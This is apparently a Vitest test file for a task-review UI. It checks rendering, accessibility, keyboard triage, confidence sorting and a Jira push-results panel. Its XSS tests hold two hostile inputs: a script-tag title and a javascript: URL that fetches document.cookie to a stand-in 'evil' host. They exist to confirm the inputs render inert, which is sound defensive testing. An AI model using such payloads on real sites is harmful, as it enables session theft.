// ui/src/render.test.js — UI.4a (ui-11, ui-12, ui-13)
//
// Covers the review-flow structural core:
//   (a) ui-13 — a <script>-titled section renders INERT (XSS guard).
//   (b) ui-12 — a collapsible card header is an accessible button
//       (role/tabindex/aria-expanded) that toggles on Enter AND Space,
//       and shows a status TEXT label beside the dot (WCAG 1.4.1).
//   (c) ui-11 — an in-place patch of one card preserves another card's
//       expanded state (patch does not innerHTML-wipe the list).
import { describe, it, expect, beforeEach } from 'vitest'
import {
  renderTasks,
  patchTaskCard,
  escapeHtml,
  resolveTriageAction,
  isTypingTarget,
  sortTasksByConfidence,
  triageCard,
  moveCardFocus,
  orderedTaskCards,
  renderPushResults,
} from './render.js'
import { $taskData, setTaskData } from './state.js'
import { markTasksLoaded } from './render.js'

// Minimal DOM scaffold: the containers + the <template> render.js clones from.
// Kept in sync with ui/index.html #taskCardTemplate so the module is testable
// without loading the full page.
function mountDom() {
  document.body.innerHTML = `
    <div id="toastContainer"></div>
    <div id="showingCount"></div>
    <select id="jiraHierarchy"><option value="epic_task" selected>epic_task</option></select>
    <input type="checkbox" id="filterPending" checked>
    <input type="checkbox" id="filterApproved" checked>
    <input type="checkbox" id="filterRejected">
    <input type="checkbox" id="filterPushed" checked>
    <input type="checkbox" id="filterFlagged">
    <select id="sortConfidence"><option value="none" selected>none</option><option value="asc">asc</option><option value="desc">desc</option></select>
    <div id="taskListWrap"><div id="taskList"></div></div>
    <template id="taskCardTemplate">
      <div class="task-card">
        <div class="task-header">
          <div class="task-title-area">
            <div class="status-indicator"></div>
            <span class="task-title-text"></span>
            <div class="task-badges"></div>
          </div>
          <svg class="chevron"><polyline points="6 9 12 15 18 9"></polyline></svg>
        </div>
        <div class="task-body">
          <div class="task-body-content">
            <div class="task-details">
              <div class="source-ref"></div>
              <input type="text" class="input-field task-edit-title">
              <textarea class="input-field task-edit-desc"></textarea>
              <textarea class="input-field task-edit-usecase"></textarea>
              <textarea class="input-field task-edit-ac"></textarea>
              <textarea class="input-field task-edit-cc"></textarea>
              <textarea class="input-field task-edit-del"></textarea>
            </div>
            <div class="task-actions">
              <button class="btn btn-success btn-approve">Approve</button>
              <button class="btn btn-danger btn-reject">Reject</button>
              <button class="btn btn-outline btn-save">Save Edits</button>
              <div class="task-status-text"></div>
            </div>
          </div>
        </div>
      </div>
    </template>
  `
}

function keydown(el, key) {
  const ev = new window.KeyboardEvent('keydown', { key, bubbles: true, cancelable: true })
  el.dispatchEvent(ev)
}

function makeTask(over = {}) {
  return {
    id: 't1',
    title: 'A task',
    status: 'OPEN',
    confidence: 0.9,
    flags: [],
    short_description: '',
    use_case: '',
    acceptance_criteria: [],
    considerations_constraints: [],
    deliverables: [],
    source_refs: [{ section_title: 'General', page_start: 1, page_end: 2 }],
    ...over,
  }
}

beforeEach(() => {
  mountDom()
  markTasksLoaded()
})

describe('ui-13 — XSS guard on section titles', () => {
  it('renders a <script>-titled section inert (no script node, escaped text)', () => {
    const evil = '<script>window.__pwned = true</script>'
    setTaskData({
      tasks: [makeTask({ source_refs: [{ section_title: evil, page_start: 1, page_end: 2 }] })],
      config: {},
    })
    renderTasks(() => {})

    const taskList = document.getElementById('taskList')
    // No live <script> element should be injected by the section title.
    expect(taskList.querySelector('script')).toBeNull()
    expect(window.__pwned).toBeUndefined()
    // The literal text is still present (escaped, as text content).
    expect(taskList.textContent).toContain('<script>')
  })

  it('escapeHtml neutralizes angle brackets and quotes', () => {
    expect(escapeHtml('<b>&"\'')).toBe('&lt;b&gt;&amp;&quot;&#39;')
  })
})

describe('ui-12 — accessible collapsibles', () => {
  it('header is a keyboard-operable button with aria wiring', () => {
    setTaskData({ tasks: [makeTask()], config: {} })
    renderTasks(() => {})

    const header = document.querySelector('.task-card .task-header')
    expect(header.getAttribute('role')).toBe('button')
    expect(header.getAttribute('tabindex')).toBe('0')
    expect(header.getAttribute('aria-expanded')).toBe('false')

    const controls = header.getAttribute('aria-controls')
    expect(controls).toBeTruthy()
    expect(document.getElementById(controls)).not.toBeNull()
  })

  it('Enter and Space both toggle expansion', () => {
    setTaskData({ tasks: [makeTask()], config: {} })
    renderTasks(() => {})

    const card = document.querySelector('.task-card')
    const header = card.querySelector('.task-header')

    expect(card.classList.contains('expanded')).toBe(false)
    keydown(header, 'Enter')
    expect(card.classList.contains('expanded')).toBe(true)
    expect(header.getAttribute('aria-expanded')).toBe('true')

    keydown(header, ' ')
    expect(card.classList.contains('expanded')).toBe(false)
    expect(header.getAttribute('aria-expanded')).toBe('false')
  })

  it('collapsed header shows a status TEXT label beside the dot', () => {
    setTaskData({ tasks: [makeTask({ status: 'APPROVED' })], config: {} })
    renderTasks(() => {})

    const header = document.querySelector('.task-card .task-header')
    const label = header.querySelector('.status-label')
    expect(label).not.toBeNull()
    expect(label.textContent.toLowerCase()).toContain('approved')
  })
})

describe('ui-11 — optimistic in-place patch', () => {
  it('patching one card preserves another card expanded state (no list wipe)', () => {
    setTaskData({
      tasks: [makeTask({ id: 't1', title: 'One' }), makeTask({ id: 't2', title: 'Two' })],
      config: {},
    })
    renderTasks(() => {})

    // Expand card t2 by hand.
    const cardTwo = document.querySelector('[data-task-id="t2"]')
    cardTwo.classList.add('expanded')
    expect(cardTwo.classList.contains('expanded')).toBe(true)

    // Grab a stable reference to t2's DOM node to prove it is NOT recreated.
    const cardTwoRef = cardTwo

    // Patch t1 only.
    patchTaskCard({ ...makeTask({ id: 't1', title: 'One (edited)' }) }, () => {})

    // t2 must still exist, be the SAME node, and still be expanded.
    const cardTwoAfter = document.querySelector('[data-task-id="t2"]')
    expect(cardTwoAfter).toBe(cardTwoRef)
    expect(cardTwoAfter.classList.contains('expanded')).toBe(true)

    // t1 must reflect the edit.
    const cardOneAfter = document.querySelector('[data-task-id="t1"]')
    expect(cardOneAfter.querySelector('.task-title-text').textContent).toBe('One (edited)')

    // The store is updated in place for t1.
    const stored = $taskData.get().tasks.find((t) => t.id === 't1')
    expect(stored.title).toBe('One (edited)')
  })

  it('patch preserves the patched card own expanded state', () => {
    setTaskData({ tasks: [makeTask({ id: 't1' })], config: {} })
    renderTasks(() => {})

    const card = document.querySelector('[data-task-id="t1"]')
    card.classList.add('expanded')

    patchTaskCard({ ...makeTask({ id: 't1', title: 'still open' }) }, () => {})

    const after = document.querySelector('[data-task-id="t1"]')
    expect(after.classList.contains('expanded')).toBe(true)
  })
})

describe('ui-14 — keyboard triage dispatch (pure)', () => {
  it('maps keys to triage actions when NOT typing', () => {
    expect(resolveTriageAction({ key: 'a', isTyping: false })).toBe('approve')
    expect(resolveTriageAction({ key: 'r', isTyping: false })).toBe('reject')
    expect(resolveTriageAction({ key: 'e', isTyping: false })).toBe('expand')
    expect(resolveTriageAction({ key: 'j', isTyping: false })).toBe('next')
    expect(resolveTriageAction({ key: 'k', isTyping: false })).toBe('prev')
    expect(resolveTriageAction({ key: 'ArrowDown', isTyping: false })).toBe('next')
    expect(resolveTriageAction({ key: 'ArrowUp', isTyping: false })).toBe('prev')
  })

  it('is case-insensitive for the letter keys', () => {
    expect(resolveTriageAction({ key: 'A', isTyping: false })).toBe('approve')
    expect(resolveTriageAction({ key: 'R', isTyping: false })).toBe('reject')
  })

  it('NEVER fires while typing in a form control', () => {
    for (const key of ['a', 'r', 'e', 'j', 'k', 'ArrowDown', 'ArrowUp']) {
      expect(resolveTriageAction({ key, isTyping: true })).toBe(null)
    }
  })

  it('returns null for unrelated keys', () => {
    expect(resolveTriageAction({ key: 'x', isTyping: false })).toBe(null)
    expect(resolveTriageAction({ key: 'Enter', isTyping: false })).toBe(null)
  })

  it('isTypingTarget detects text-entry controls', () => {
    const input = document.createElement('input')
    const ta = document.createElement('textarea')
    const sel = document.createElement('select')
    const div = document.createElement('div')
    expect(isTypingTarget(input)).toBe(true)
    expect(isTypingTarget(ta)).toBe(true)
    expect(isTypingTarget(sel)).toBe(true)
    expect(isTypingTarget(div)).toBe(false)
    expect(isTypingTarget(null)).toBe(false)
  })
})

describe('ui-14 — triage acts on the FOCUSED card only, not while typing', () => {
  it('triageCard approves the focused card via its save callback', () => {
    const saved = []
    setTaskData({ tasks: [makeTask({ id: 't1' }), makeTask({ id: 't2' })], config: {} })
    renderTasks((dt) => saved.push(dt))

    const cards = orderedTaskCards()
    // Simulate the main.js handler: dispatch on the focused card.
    const action = resolveTriageAction({ key: 'a', isTyping: false })
    triageCard(action, cards[1])

    expect(saved.length).toBe(1)
    expect(saved[0].id).toBe('t2')
    expect(saved[0].status).toBe('APPROVED')
  })

  it('a keypress inside a card input does NOT trigger triage', () => {
    const saved = []
    setTaskData({ tasks: [makeTask({ id: 't1' })], config: {} })
    renderTasks((dt) => saved.push(dt))

    const card = orderedTaskCards()[0]
    const input = card.querySelector('.task-edit-title')
    // The guard: main.js computes isTyping from the event target.
    const action = resolveTriageAction({ key: 'a', isTyping: isTypingTarget(input) })
    expect(action).toBe(null)
    if (action) triageCard(action, card)
    expect(saved.length).toBe(0)
  })

  it('expand triage toggles the focused card', () => {
    setTaskData({ tasks: [makeTask({ id: 't1' })], config: {} })
    renderTasks(() => {})
    const card = orderedTaskCards()[0]
    expect(card.classList.contains('expanded')).toBe(false)
    triageCard('expand', card)
    expect(card.classList.contains('expanded')).toBe(true)
  })

  it('moveCardFocus walks j/k between cards and wraps', () => {
    setTaskData({ tasks: [makeTask({ id: 't1' }), makeTask({ id: 't2' })], config: {} })
    renderTasks(() => {})
    const cards = orderedTaskCards()
    // No focus yet → next focuses first.
    const a = moveCardFocus('next', null)
    expect(a).toBe(cards[0])
    const b = moveCardFocus('next', cards[0])
    expect(b).toBe(cards[1])
    // Wrap forward.
    const c = moveCardFocus('next', cards[1])
    expect(c).toBe(cards[0])
    // Wrap backward.
    const d = moveCardFocus('prev', cards[0])
    expect(d).toBe(cards[1])
  })
})

describe('ui-14 — confidence sort + badge', () => {
  it('sortTasksByConfidence surfaces low-confidence first (asc) without mutating', () => {
    const tasks = [{ confidence: 0.9 }, { confidence: 0.3 }, { confidence: 0.6 }]
    const asc = sortTasksByConfidence(tasks, 'asc')
    expect(asc.map((t) => t.confidence)).toEqual([0.3, 0.6, 0.9])
    // original untouched
    expect(tasks[0].confidence).toBe(0.9)
    const desc = sortTasksByConfidence(tasks, 'desc')
    expect(desc.map((t) => t.confidence)).toEqual([0.9, 0.6, 0.3])
    const none = sortTasksByConfidence(tasks, 'none')
    expect(none.map((t) => t.confidence)).toEqual([0.9, 0.3, 0.6])
  })

  it('renders a text-labelled confidence badge on the card header', () => {
    setTaskData({ tasks: [makeTask({ confidence: 0.42 })], config: {} })
    renderTasks(() => {})
    const badge = document.querySelector('.conf-badge')
    expect(badge).not.toBeNull()
    expect(badge.textContent).toContain('42%')
    expect(badge.classList.contains('conf-low')).toBe(true)
  })

  it('applies the sort control when rendering (low-confidence first)', () => {
    document.getElementById('sortConfidence').value = 'asc'
    setTaskData({
      tasks: [
        makeTask({ id: 'hi', confidence: 0.95, source_refs: [{ section_title: 'S', page_start: 1, page_end: 1 }] }),
        makeTask({ id: 'lo', confidence: 0.1, source_refs: [{ section_title: 'S', page_start: 1, page_end: 1 }] }),
      ],
      config: {},
    })
    renderTasks(() => {})
    const cards = orderedTaskCards()
    expect(cards[0].dataset.taskId).toBe('lo')
    expect(cards[1].dataset.taskId).toBe('hi')
  })
})

describe('ui-23 — push results panel', () => {
  it('lists pushed tasks with clickable Jira links', () => {
    const panel = renderPushResults({
      tasks: [
        { id: '1', title: 'First', status: 'PUSHED', jira_issue_key: 'PROJ-1' },
        { id: '2', title: 'Second', status: 'PUSHED', jira_issue_key: 'PROJ-2' },
        { id: '3', title: 'NotPushed', status: 'APPROVED' },
      ],
      jiraServerUrl: 'https://acme.atlassian.net/',
    })
    expect(panel).not.toBeNull()
    const links = panel.querySelectorAll('a.push-results-key')
    expect(links.length).toBe(2)
    expect(links[0].getAttribute('href')).toBe('https://acme.atlassian.net/browse/PROJ-1')
    expect(links[0].textContent).toBe('PROJ-1')
    expect(links[0].target).toBe('_blank')
  })

  it('surfaces an aggregate failure chip when some pushes failed', () => {
    const panel = renderPushResults({
      tasks: [{ id: '1', title: 'Ok', status: 'PUSHED', jira_issue_key: 'PROJ-1' }],
      jiraServerUrl: 'https://acme.atlassian.net',
      failedCount: 2,
      firstError: 'permission denied',
      errorChip: { label: 'Check credentials', className: 'sev-fixable' },
    })
    const chip = panel.querySelector('.sev-chip')
    expect(chip).not.toBeNull()
    expect(chip.textContent).toBe('Check credentials')
    expect(panel.textContent).toContain('permission denied')
    expect(panel.querySelector('.push-results-summary').textContent).toContain('2 failed')
  })

  it('returns null and renders nothing when there is nothing to report', () => {
    const panel = renderPushResults({ tasks: [{ status: 'APPROVED' }], jiraServerUrl: '' })
    expect(panel).toBe(null)
    expect(document.getElementById('pushResultsPanel')).toBeNull()
  })

  it('does NOT emit a javascript:/non-http Jira-server link (XSS guard) — falls back to plain text', () => {
    const panel = renderPushResults({
      tasks: [{ id: '1', title: 'First', status: 'PUSHED', jira_issue_key: 'PROJ-1' }],
      jiraServerUrl: 'javascript:fetch("//evil/"+document.cookie)//',
    })
    // No anchor at all — the malicious scheme is rejected, key shown as text.
    expect(panel.querySelector('a')).toBeNull()
    const key = panel.querySelector('.push-results-key')
    expect(key.tagName).toBe('SPAN')
    expect(key.textContent).toBe('PROJ-1')
    // Belt-and-braces: nothing in the panel carries a javascript: href.
    expect(panel.innerHTML.toLowerCase()).not.toContain('javascript:')
  })
})
